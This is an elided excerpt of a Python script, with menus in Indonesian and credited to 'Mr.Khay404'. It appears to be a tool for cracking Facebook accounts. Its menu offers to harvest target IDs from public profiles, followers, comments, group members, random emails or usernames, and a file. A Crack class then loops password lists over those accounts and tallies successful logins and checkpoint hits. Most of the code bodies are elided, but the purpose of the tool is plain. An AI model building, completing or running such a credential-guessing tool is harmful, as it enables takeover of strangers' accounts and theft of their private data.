...
""",width=80,title="● ● ●",style=f"{color_panel}"))
...
class Menu:
	...
	def menu(self):
		...
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"""{M2}>{K2}>{H2}>{color_text}{P2}    Author : {M2}Mr.Khay404 {color_text} |  {P2}Version : {M2}2.0.      {H2}<{K2}<{M2}<""",width=80,style=f"{color_panel}"))

		prints(Panel(f"{P2}{self.ip}",padding=(0,20),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""                     {M2}>{K2}>{H2}> {M2}●{K2}●{H2}●{H2} <{K2}<{M2}<""",width=80,style=f"{color_panel}"))
		prints(Panel(f"""            {M2}>{K2}>{H2}>{P2} 1. {color_text}CRACK DARI ID publik
            {M2}>{K2}>{H2}>{P2} 2. {color_text}CRACK DARI PENGIKUT {P2}({M2}UPDATE{P2})
            {M2}>{K2}>{H2}>{P2} 3. {color_text}CRACK DARI KOMENTAR
            {M2}>{K2}>{H2}>{P2} 4. {color_text}CRACK DARI MAIL RANDOM
            {M2}>{K2}>{H2}>{P2} 5. {color_text}CRACK DARI RANDOM USERNAME
            {M2}>{K2}>{H2}>{P2} 6. {color_text}CRACK DARI PENCARIAN NAMA
            {M2}>{K2}>{H2}>{P2} 7. {color_text}CRACK DARI MEMBER GRUP 
            {M2}>{K2}>{H2}>{P2} 8. {color_text}CRACK DARI FILE SENDIRI""",width=80,title="MENU",padding=(0,0),style=f"{color_panel}"))
  
		prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,title="● ● ●",padding=(0,6),style=f"{color_panel}"))
		...
		###----------[ USERNAME ]---------- ###
			...
			user = console.input(f" {H2}• {P2} ╰─> Username  : ")
			limit = console.input(f" {H2}• {P2} ╰─> Limit : ")
		...
		###----------[ PENCARIAN NAMA ]---------- ###
			...
			user = console.input(f" {H2}• {P2} ╰─>  nama : ")
		...
		###----------[ MEMBER GRUP ]---------- ###
			...
			user = console.input(f" {H2}• {P2} ╰─>  id grup : ")
		...
		###----------[ FILE MASSAL ]---------- ###
			...
			user = console.input(f" {H2}• {P2} ╰─>  tempat file : ")
		...
		try:
			...
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					...
					console.print(f" {H2}• {P2} ╰─>  :berhasil mendapatkan {len(tampung)} id....", end="\r")
...
class Crack:
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}•{P2} Prosses {H2}Crack{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
